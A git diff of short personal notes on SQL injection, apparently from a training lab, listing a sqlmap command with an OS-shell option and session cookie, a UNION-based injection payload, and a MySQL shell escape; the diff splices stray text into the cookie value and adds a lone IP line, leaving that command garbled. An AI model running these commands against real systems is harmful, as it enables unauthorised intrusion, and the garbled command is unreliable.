@@ -2,14 +2,14 @@
 ## Stardard usage
  - MySQL
 <hr>
-
+10.129.228.56k
 ### Automatic tools for sql injection
 #### sqlmap
 -  for http endpoint api query
 -  Usage:
    -  Reverse shell
     ```bash
-    sqlmap -u http://10.129.207.176/dashboard.php\?search\= --cookie="PHPSESSID=vkrvi768lbi9l638e7n8ovv03e" --os-shell
+    sqlmap -u http://10.129.207.176/dashboard.php\?search\= --cookie="PHPSESSID=vkrvi768lbi9USE mysql;l638e7n8ovv03e" --os-shell
     ```
    -  Init scanning db
     ```bash
@@ -38,3 +38,8 @@
     ```sql
     "test' and 1=2 UNION SELECT 1,sqlite_version(),3 -- -
     ```
+
+### Shell in msql
+```bash
+\! sh
+```
